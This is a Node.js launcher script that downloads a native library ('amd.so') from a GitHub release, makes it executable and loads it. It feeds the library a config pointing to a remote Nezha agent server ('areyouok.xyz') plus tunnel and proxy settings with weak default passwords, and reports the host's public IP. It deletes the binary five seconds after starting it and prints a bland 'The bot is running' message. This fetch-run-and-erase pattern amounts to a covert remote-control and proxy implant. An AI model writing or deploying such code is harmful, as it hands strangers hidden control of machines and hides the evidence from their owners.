#!/usr/bin/env node

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');

const SO_FILE_NAME = 'amd.so';
const SO_FILE_URL = 'https://github.com/you/ok/releases/download/your/amd.so';
const filePath = path.join(__dirname, SO_FILE_NAME);

async function grantExecutionPermission(targetPath) {
    try {
        fs.chmodSync(targetPath, 0o755);
        return true;
    } catch (err) {
        console.log(`⚠️ fs.chmodSync failed: ${err.message}`);
        return false;
    }
}

async function downloadFile(fileName, fileUrl) {
    if (fs.existsSync(filePath)) {
        await grantExecutionPermission(filePath);
        return true;
    }

    try {
        await new Promise((resolve, reject) => {
            const fileStream = fs.createWriteStream(filePath);
            const request = https.get(fileUrl, (response) => {
                if (response.statusCode >= 300 && response.statusCode < 400 && response.headers.location) {
                    https.get(response.headers.location, (redirectResponse) => {
                        if (redirectResponse.statusCode !== 200) {
                            reject(new Error(`HTTP ${redirectResponse.statusCode}`));
                            return;
                        }
                        redirectResponse.pipe(fileStream);
                        fileStream.on('finish', resolve);
                        fileStream.on('error', reject);
                    }).on('error', reject);
                    return;
                }

                if (response.statusCode !== 200) {
                    reject(new Error(`HTTP ${response.statusCode}`));
                    return;
                }
                
                response.pipe(fileStream);
                fileStream.on('finish', () => {
                    fileStream.close();
                    resolve();
                });
                fileStream.on('error', (err) => {
                    fs.unlink(filePath, () => {});
                    reject(err);
                });
            }).on('error', (err) => {
                fs.unlink(filePath, () => {});
                reject(err);
            });

            request.setTimeout(30000, () => {
                request.destroy();
                reject(new Error('Download timeout'));
            });
        });

        if (fs.existsSync(filePath) && fs.statSync(filePath).size > 1000) {
            await grantExecutionPermission(filePath);
            return true;
        }
    } catch (err) {
    }

    try {
        try {
            require.resolve('axios');
        } catch {
            throw new Error('axios not installed');
        }
        const axios = require('axios');
        const response = await axios({ method: 'get', url: fileUrl, responseType: 'stream', timeout: 60000 });
        const writer = fs.createWriteStream(filePath);
        response.data.pipe(writer);
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        if (fs.existsSync(filePath) && fs.statSync(filePath).size > 1000) {
            await grantExecutionPermission(filePath);
            return true;
        }
    } catch (err) {
    }

    if (fs.existsSync(filePath)) {
        fs.unlinkSync(filePath);
    }
    console.error(`❌ ${fileName} download failed permanently`);
    return false;
}

function fetchIP(url, clientModule) {
    return new Promise((resolve, reject) => {
        const req = clientModule.get(url, { timeout: 3000 }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (res.statusCode === 200 && data.trim()) {
                    resolve(data.trim());
                } else {
                    reject(new Error('Status code error'));
                }
            });
        });
        req.on('error', (err) => reject(err));
        req.on('timeout', () => {
            req.destroy();
            reject(new Error('Timeout'));
        });
    });
}

async function getPublicIP() {
    const apiList = [
        { url: 'http://ip.icanhazip.com', client: http },
        { url: 'http://api.ip.sb/ip', client: http },
        { url: 'https://api.ipify.org', client: https },
        { url: 'http://ip.42.pl/raw', client: http }
    ];

    for (const api of apiList) {
        try {
            const ip = await fetchIP(api.url, api.client);
            if (ip && ip.includes('.')) return ip; 
        } catch (e) {
            // 静默切换下一个
        }
    }

    try {
        const interfaces = os.networkInterfaces();
        for (const devName in interfaces) {
            const iface = interfaces[devName];
            for (let i = 0; i < iface.length; i++) {
                const alias = iface[i];
                if (alias.family === 'IPv4' && !alias.internal) {
                    if (!alias.address.startsWith('10.') && 
                        !alias.address.startsWith('192.168.') && 
                        !alias.address.startsWith('172.')) {
                        return alias.address;
                    }
                }
            }
        }
    } catch (err) {}

    return '';
}

let StopAgent = null;

async function run() {
    const downloadSuccess = await downloadFile(SO_FILE_NAME, SO_FILE_URL);
    if (!downloadSuccess) {
        console.error(`致命错误: 未能获取到 ${SO_FILE_NAME} 文件，终止启动。`);
        process.exit(1);
    }

    try {
        const koffi = require('koffi');
        const lib = koffi.load(filePath);

        const InitAgentConfig = lib.func('void InitAgentConfig(const char *jsonPayload)');
        const StartAgent = lib.func('void StartAgent()');
        StopAgent = lib.func('void StopAgent()');

        const publicIP = await getPublicIP();

        const configData = {
            uuid: process.env.UUID || "8ff07af2-df4d-4148-a688-ff4c89bddcff",
            server: process.env.NEZHA_SERVER || "areyouok.xyz:443",
            key: process.env.NEZHA_KEY || "",
            argoAuth: process.env.ARGO_AUTH || "",
            argoPort: process.env.ARGO_PORT || "",
            edgeIpVersion: process.env.EDGE_IP_VERSION || "0",
            tuicPort: process.env.TUIC_PORT || "",
            tuicDomain: process.env.TUIC_DOMAIN || "www.bing.com",
            tuicPassword: process.env.TUIC_PASSWORD || "admin",
            hy2Port: process.env.HY2_PORT || "",
            hy2Domain: process.env.HY2_DOMAIN || "www.bing.com",
            ip: publicIP
        };

        const jsonString = JSON.stringify(configData);

        InitAgentConfig(jsonString);

        StartAgent();
        console.log('The bot is running');

        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                }
            } catch (err) {
            }
        }, 5000);

        setInterval(() => {}, 3600000);
    } catch (err) {
        console.error('运行期发生致命异常:', err);
    }
}

process.on('SIGINT', () => {
    try { 
        if (StopAgent) StopAgent(); 
    } catch(e){}
    process.exit(0);
});
run();